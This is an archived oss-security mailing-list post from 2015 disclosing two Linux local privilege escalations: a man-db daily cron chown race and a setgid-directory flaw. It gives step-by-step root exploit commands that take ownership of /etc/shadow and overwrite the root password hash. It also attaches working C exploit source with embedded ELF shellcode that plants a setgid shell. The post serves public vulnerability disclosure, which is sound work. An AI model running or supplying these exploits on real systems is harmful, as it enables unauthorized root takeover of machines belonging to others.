X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8070" "Saturday" "19" "December" "2015" "11:23:49" "+0000" "halfdog" "me@halfdog.net" "<56753E45.6080707@halfdog.net>" "216" "Re: [oss-security] User man Local Root Exploit/Linux Kernel setgid Directory Privilege Escalation/PAM Owner Check Weakness" "^Date:" nil nil "12" "2015121911:23:49" "[oss-security] User man Local Root Exploit/Linux Kernel setgid Directory Privilege Escalation/PAM Owner Check Weakness" (number mark "        me@halfdog.n Dec 19  216/8070  " thread-indent "\"Re: [oss-security] User man Local Root Exploit/Linux Kernel setgid Directory Privilege Escalation/PAM Owner Check Weakness\"\n") "<20151214215407.GA26624@openwall.com>" ("<565F679F.9050600@halfdog.net>" "<566E0678.1080808@halfdog.net>" "<86fuz570iy.fsf@desk.des.no>" "<566F3135.4050009@halfdog.net>" "<20151214215407.GA26624@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 7630 invoked by uid 550); 20 Dec 2015 19:54:52 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 7606 invoked from network); 20 Dec 2015 19:54:51 -0000
References: <565F679F.9050600@halfdog.net> <566E0678.1080808@halfdog.net>
 <86fuz570iy.fsf@desk.des.no> <566F3135.4050009@halfdog.net>
 <20151214215407.GA26624@openwall.com>
Message-ID: <56753E45.6080707@halfdog.net>
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0
MIME-Version: 1.0
In-Reply-To: <20151214215407.GA26624@openwall.com>
Content-Type: multipart/mixed;
 boundary="------------040807080703040204050905"
Date: Sat, 19 Dec 2015 11:23:49 +0000
From: halfdog <me@halfdog.net>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] User man Local Root Exploit/Linux Kernel setgid
 Directory Privilege Escalation/PAM Owner Check Weakness
To: oss-security@lists.openwall.com

--------------040807080703040204050905
Content-Type: text/plain; charset=ISO-8859-1
Content-Transfer-Encoding: 7bit

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Solar Designer wrote:
> halfdog -
> 
>> http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/
>>
>> 
http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
> 
> Thank you for documenting these peculiar findings.  While your web
> pages are nicely formatted and have helpful cross-references, could
> you please post the actual content to oss-security directly? ...

Sorry, forgot that. I think you mentioned it already in some other
post on this list.

!!! Just for reference, please ignore !!!

The daily mandb cleanup job for old catman pages changes the
permissions of all non-man files to user man. This happens e.g. under
Ubuntu Vivid with /etc/cron.daily/man-db when systemd is not installed
(/run/systemd/system does not exist). The problematic code is

# expunge old catman pages which have not been read in a week
if [ ! -d /run/systemd/system ] && [ -d /var/cache/man ]; then
  cd /
  if ! dpkg-statoverride --list /var/cache/man >/dev/null 2>&1; then
    echo "Running find" >&2
    find /var/cache/man -ignore_readdir_race ! -user man -print0 | \
      xargs -r0 chown -f man || true
  fi
  start-stop-daemon --start --pidfile /dev/null --startas /bin/sh \
        --oknodo --chuid man $iosched_idle -- -c \
        "find /var/cache/man -type f -name '*.gz' -atime +6 -print0 | \
         xargs -r0 rm -f"
fi

With https://www.halfdog.net/Misc/Utils/DirModifyInotify.c this can be
used to change owenership of /etc/shadow and escalate to root. To
start, a hardlink to a file of a different user has to be created.

man# mkdir -p /var/cache/man/etc
man# ln /var/crash/.lock /var/cache/man/etc/shadow
man# ./DirModifyInotify --Watch /var/cache/man/etc --WatchCount 0
- --MovePath /var/cache/man/etc --LinkTarget /etc
... Wait till daily cronjob was run
man# cp /etc/shadow .
man# sed -r -e
's/^root:.*/root:$1$kKBXcycA$w.1NUJ77AuKcSYYrjLn9s1:15462:0:99999:7:::/'
/etc/shadow > x
man# cat x > /etc/shadow; rm x
man# su -s /bin/sh (password is 123)
root# cat shadow > /etc/shadow; chown root /etc/shadow

Read more at
http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/




On some Linux systems, directories with setgid bit set may be found,
e.g. using find / -type d -perm -02000. On Ubuntu Vivid this includes

drwxr-sr-x 25 man  root  4096 May 15 00:40 /var/cache/man

Creating a file as user man/man with setgid-bit flags will produce a
file with setgit bit really set but uid man/root. Normal writes will
cause loss of setgid bit, but crafted writing allows to fill the file
and hence escalate privileges to group root:

man$ cd /var/cache/man
man$ wget -q
http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/CreateSetgidBinary.c
man$ gcc -o CreateSetgidBinary CreateSetgidBinary.c
man$ ./CreateSetgidBinary ./escalate /bin/mount x nonexistent-arg
man$ ls -al ./escalate
- -rwsrwsr-t 1 man root 155 May 15 02:12 ./escalate
man$ ./escalate /bin/sh
man$ ls -al /proc/self/
total 0
dr-xr-xr-x   9 man  root 0 May 15 02:13 .

Read more at
http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/

- -- 
http://www.halfdog.net/
PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iEYEARECAAYFAlZ1PjoACgkQxFmThv7tq+6ouQCfZbKWiexcNN/iWNZb7Wc4Lhg1
vXQAn10Rx8RZVDVlSB4haUTQfsMlE3dv
=m9be
-----END PGP SIGNATURE-----

--------------040807080703040204050905
Content-Type: text/x-csrc;
 name="CreateSetgidBinary.c"
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment;
 filename="CreateSetgidBinary.c"

/** This software is provided by the copyright owner "as is" and any
 *  expressed or implied warranties, including, but not limited to,
 *  the implied warranties of merchantability and fitness for a particular
 *  purpose are disclaimed. In no event shall the copyright owner be
 *  liable for any direct, indirect, incidential, special, exemplary or
 *  consequential damages, including, but not limited to, procurement
 *  of substitute goods or services, loss of use, data or profits or
 *  business interruption, however caused and on any theory of liability,
 *  whether in contract, strict liability, or tort, including negligence
 *  or otherwise, arising in any way out of the use of this software,
 *  even if advised of the possibility of such damage.
 *
 *  This tool allows to create a setgid binary in appropriate directory
 *  to escalate to the group of this directory.
 *
 *  Compile: gcc -o CreateSetgidBinary CreateSetgidBinary.c
 *
 *  Usage: CreateSetgidBinary [targetfile] [suid-binary] [placeholder] [args]
 *
 *  Example: 
 *
 *  # ./CreateSetgidBinary ./escalate /bin/mount x nonexistent-arg
 *  # ls -al ./escalate
 *  # ./escalate /bin/sh
 *
 *  Copyright (c) 2015 halfdog <me (%) halfdog.net>
 *
 *  See http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/ for more information.
 */

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/resource.h>
#include <unistd.h>

int main(int argc, char **argv) {
// No slashes allowed, everything else is OK.
  char suidExecMinimalElf[] = {
      0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
      0x80, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0xf8, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x02, 0x00, 0x28, 0x00,
      0x05, 0x00, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0xa2, 0x00, 0x00, 0x00,
      0xa2, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
      0x01, 0x00, 0x00, 0x00, 0xa4, 0x00, 0x00, 0x00, 0xa4, 0x90, 0x04, 0x08,
      0xa4, 0x90, 0x04, 0x08, 0x09, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
      0x06, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xc0, 0x89, 0xc8,
      0x89, 0xd0, 0x89, 0xd8, 0x04, 0xd2, 0xcd, 0x80, 0x31, 0xc0, 0x89, 0xd0,
      0xb0, 0x0b, 0x89, 0xe1, 0x83, 0xc1, 0x08, 0x8b, 0x19, 0xcd, 0x80
  };

  int destFd=open(argv[1], O_RDWR|O_CREAT, 07777);
  if(destFd<0) {
    fprintf(stderr, "Failed to open %s, error %s\n", argv[1], strerror(errno));
    return(1);
  }

  char *suidWriteNext=suidExecMinimalElf;
  char *suidWriteEnd=suidExecMinimalElf+sizeof(suidExecMinimalElf);
  while(suidWriteNext!=suidWriteEnd) {
    char *suidWriteTestPos=suidWriteNext;
    while((!*suidWriteTestPos)&&(suidWriteTestPos!=suidWriteEnd))
      suidWriteTestPos++;
// We cannot write any 0-bytes. So let seek fill up the file wihh
// null-bytes for us.
    lseek(destFd, suidWriteTestPos-suidExecMinimalElf, SEEK_SET);
    suidWriteNext=suidWriteTestPos;
    while((*suidWriteTestPos)&&(suidWriteTestPos!=suidWriteEnd))
      suidWriteTestPos++;

    int result=fork();
    if(!result) {
      struct rlimit limits;

// We can't truncate, that would remove the setgid property of
// the file. So make sure the SUID binary does not write too much.
      limits.rlim_cur=suidWriteTestPos-suidExecMinimalElf;
      limits.rlim_max=limits.rlim_cur;
      setrlimit(RLIMIT_FSIZE, &limits);

// Do not rely on some SUID binary to print out the unmodified
// program name, some OSes might have hardening against that.
// Let the ld-loader will do that for us.
      limits.rlim_cur=1<<22;
      limits.rlim_max=limits.rlim_cur;
      result=setrlimit(RLIMIT_AS, &limits);

      dup2(destFd, 1);
      dup2(destFd, 2);
      argv[3]=suidWriteNext;
      execve(argv[2], argv+3, NULL);
      fprintf(stderr, "Exec failed\n");
      return(1);
    }
    waitpid(result, NULL, 0);
    suidWriteNext=suidWriteTestPos;
//  ftruncate(destFd, suidWriteTestPos-suidExecMinimalElf);
  }
  fprintf(stderr, "Completed\n");
  return(0);
}

--------------040807080703040204050905--
